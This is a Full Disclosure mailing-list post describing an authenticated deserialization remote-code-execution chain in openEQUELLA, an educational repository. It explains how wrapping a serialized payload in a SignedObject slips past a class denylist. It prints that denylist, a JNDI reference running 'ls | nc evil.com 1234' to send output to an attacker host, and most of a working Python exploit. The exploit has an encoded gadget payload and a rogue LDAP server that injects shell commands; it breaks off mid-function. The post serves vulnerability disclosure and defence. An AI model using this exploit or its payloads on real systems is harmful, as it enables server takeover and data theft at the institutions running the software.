---
title: openEQUELLA authenticated RCE chain(s)
url: https://seclists.org/fulldisclosure/2026/Sep/80
source: Full Disclosure
date: 2026-09-27
fetch_date: 2026-09-28T07:57:00.181734
---

# openEQUELLA authenticated RCE chain(s)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](79)
[By Date](date.html#80)
[![Next](/images/right-icon-16x16.png)](73)

[![Previous](/images/left-icon-16x16.png)](79)
[By Thread](index.html#80)
[![Next](/images/right-icon-16x16.png)](73)

![](/shared/images/nst-icons.svg#search)

# openEQUELLA authenticated RCE chain(s)

---

*From*: evan via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Sun, 27 Sep 2026 00:39:35 +1000

---

```
SUMMARY: an authenticated deserialization vuln in openEQUELLA allows
an attacker to inject a SignedObject payload, unwrap the SignedObject,
create an LDAP callback and serve a JNR response to get the server to
execute arbitrary code. alongside this sink is a SSTI vuln as well.

https://blog.evan.lat/posts/openeq/
```

> ```
> wtf is openequella?
> ```

```
openequella is an "open source digital repository" for educational
material. it is widely used in australian universities and other large
educational institutions and certain government orgs/intl orgs (as far
as i know, at least)
```

> ```
> the vuln
> ```

```
notably openequella pre 2026.1.0 heavily relied on deserialization on
anything (you can check this by just going to prior versions on their
github and looking out objectinputstream references, especially in
/invoker/com.tle.core.remoting.RemoteUserService.service, which is
where the xp happens). this is an accepted problem; which is why they
had a denylist blocking malicious classes from being deserialized.
obviously, denylists are brittle.
```

> ```
> denylist
> ```

```
it blocks most conventional ysoserial gadgets:
org.apache.commons.collections.functors.InvokerTransformer
org.apache.commons.collections4.functors.InvokerTransformer
org.apache.commons.collections.functors.InstantiateTransformer
org.apache.commons.collections4.functors.InstantiateTransformer
org.codehaus.groovy.runtime.ConvertedClosure
org.codehaus.groovy.runtime.MethodClosure
org.springframework.beans.factory.ObjectFactory
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl

however it doesnt blocked SignedObjects (ois smuggling). to exploit
this, we can send a signedobject, which by itself contains a fresh OIS
to get around the filtered ois. from this, we can use a
beanscomparator -> jdbc -> ldap -> jnr chain to get rce. in our jnr,
we load a local class from oeq like so, to get around later java
mitigations against remote class loading:

javaNamingReference {
    javaClassName = javax.el.ELProcessor
    javaFactory   = org.apache.naming.factory.BeanFactory
    javaReferenceAddress {
        #0 forceString  = pageContext=eval
        #1 pageContext  = Runtime.getRuntime().exec(new
String[]{"sh","-c","ls -aril | nc evil.com 1234"})
    }
}

here is the exploit for the above:
import argparse, base64
import socket
import sys
import threading
import time
import requests
from ldap3.protocol.rfc4511 import *
from pyasn1.codec.ber.encoder import encode
# just the packing shit will do
from pwn import *
print("outclass")
print("")
stageone =
"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7dwEAeHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3IAAAAAAAAAAQIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7dwEAeHBwdAAGb2JqZWN0dwQAAAADc3IAGmphdmEuc2VjdXJpdHkuU2lnbmVkT2JqZWN0Cf+9aCo81f8CAANbAAdjb250ZW50dAACW0JbAAlzaWduYXR1cmVxAH4ACEwADHRoZWFsZ29yaXRobXEAfgAEdwEAeHB1cgACW0Ks8xf4BghU4AIAAHcBAHhwAAAFtKztAAVzcgAXamF2YS51dGlsLlByaW9yaXR5UXVldWWU2jC0+z+CsQMAAkkABHNpemVMAApjb21wYXJhdG9ydAAWTGphdmEvdXRpbC9Db21wYXJhdG9yO3hwAAAAAnNyACtvcmcuYXBhY2hlLmNvbW1vbnMuYmVhbnV0aWxzLkJlYW5Db21wYXJhdG9yAAAAAAAAAAECAAJMAApjb21wYXJhdG9ycQB+AAFMAAhwcm9wZXJ0eXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwcHQAEGRhdGFiYXNlTWV0YURhdGF3BAAAAANzcgAdY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcGzOJtgfSXPCBQIAB0wABGNvbm50ABVMamF2YS9zcWwvQ29ubmVjdGlvbjtMAA1pTWF0Y2hDb2x1bW5zdAASTGphdmEvdXRpbC9WZWN0b3I7TAACcHN0ABxMamF2YS9zcWwvUHJlcGFyZWRTdGF0ZW1lbnQ7TAAFcmVzTUR0ABxMamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGE7TAAGcm93c01EdAAlTGphdmF4L3NxbC9yb3dzZXQvUm93U2V0TWV0YURhdGFJbXBsO0wAAnJzdAAUTGphdmEvc3FsL1Jlc3VsdFNldDtMAA9zdHJNYXRjaENvbHVtbnNxAH4ACXhyABtqYXZheC5zcWwucm93c2V0LkJhc2VSb3dTZXRD0R2lTcKx4AIAFUkAC2NvbmN1cnJlbmN5WgAQZXNjYXBlUHJvY2Vzc2luZ0kACGZldGNoRGlySQAJZmV0Y2hTaXplSQAJaXNvbGF0aW9uSQAMbWF4RmllbGRTaXplSQAHbWF4Um93c0kADHF1ZXJ5VGltZW91dFoACHJlYWRPbmx5SQAKcm93U2V0VHlwZVoAC3Nob3dEZWxldGVkTAADVVJMcQB+AARMAAthc2NpaVN0cmVhbXQAFUxqYXZhL2lvL0lucHV0U3RyZWFtO0wADGJpbmFyeVN0cmVhbXEAfgAPTAAKY2hhclN0cmVhbXQAEExqYXZhL2lvL1JlYWRlcjtMAAdjb21tYW5kcQB+AARMAApkYXRhU291cmNlcQB+AARMAAlsaXN0ZW5lcnNxAH4ACUwAA21hcHQAD0xqYXZhL3V0aWwvTWFwO0wABnBhcmFtc3QAFUxqYXZhL3V0aWwvSGFzaHRhYmxlO0wADXVuaWNvZGVTdHJlYW1xAH4AD3hwAAAD8AEAAAPoAAAAAAAAAAIAAAAAAAAAAAAAAAABAAAD7ABwcHBwcHQAKUxEQVBfVVJMX1BMQUNFSE9MREVSX1hYWFhYWFhYWFhYWFhYWFhYWFhYc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAApwcHBwcHBwcHBweHBzcgATamF2YS51dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHBwc3EAfgAVAAAAAAAAAAp1cQB+ABgAAAAKc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cP////9xAH4AIHEAfgAgcQB+ACBxAH4AIHEAfgAgcQB+ACBxAH4AIHEAfgAgcQB+ACB4cHBwcHNxAH4AFQAAAAAAAAAKdXEAfgAYAAAACnQAAXhwcHBwcHBwcHB4cQB+ABN4dXEAfgAKAAAALjAsAhQ4rYPaRsqPG7QXM5X7eEsZUiKJpAIUY5/IRUACikQnsLGeDDQn59eEj790AA1TSEEyNTZ3aXRoRFNBcQB+AAl4"

def plbuild(url):
    t = bytearray(base64.b64decode(stageone))
    u = url.encode()
    i = t.find(b"LDAP_URL_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX")
    old = u16(bytes(t[i - 2:i]), endian="big")
    t[i - 2:i + old] = p16(len(u), endian="big") + u
    return bytes(t)

def newmsg(mid, op_name, op):
    m = LDAPMessage()
    m["messageID"] = MessageID(mid)
    m["protocolOp"].setComponentByName(op_name, op)
    return encode(m)

def bindres(mid):
    br = BindResponse()
    br["resultCode"] = ResultCode("success")
    br["matchedDN"] = LDAPDN("")
    br["diagnosticMessage"] = LDAPString("")
    return newmsg(mid, "bindResponse", br)

def search_entry(mid, dn, attrs):
    e = SearchResultEntry()
    e["object"] = LDAPDN(dn)
    pal = PartialAttributeList()
    for i, (name, vals) in enumerate(attrs):
        pa = PartialAttribute()
        pa["type"] = AttributeDescription(name)
        for j, v in enumerate(vals):
            pa["vals"].setComponentByPosition(j, AttributeValue(v))
        pal.setComponentByPosition(i, pa)
    e["attributes"] = pal
    return newmsg(mid, "searchResEntry", e)

def search_done(mid):
    d = SearchResultDone()
    d["resultCode"] = ResultCode("success")
    d["matchedDN"] = LDAPDN("")
    d["diagnosticMessage"] = LDAPString("")
    return newmsg(mid, "searchResDone", d)

def msgparser(sock):
    hdr = sock.recv(2)
    if len(hdr) < 2: return None, None
    tag, first = hdr[0], hdr[1]
    length = first if first < 128 else int.from_bytes(sock.recv(first
& 0x7f), "big")
    body = b""
    while len(body) < length:
        c = sock.recv(length - len(body))
        if not c: break
        body += c
    return tag, body

def ldapsrv(sock, addr, cmd, hit):
    esc = cmd.replace("\\", "\\\\").replace("\"", "\\\"").replace("$", "\\$")
    # payload
    el = f'Runtime.getRuntime().exec(new String[]{{"sh","-c","{esc}"}})'
    print(f"+ ldap conn from {addr}")
    try:
        while True:

            tag, body = msgparser(sock)

     ...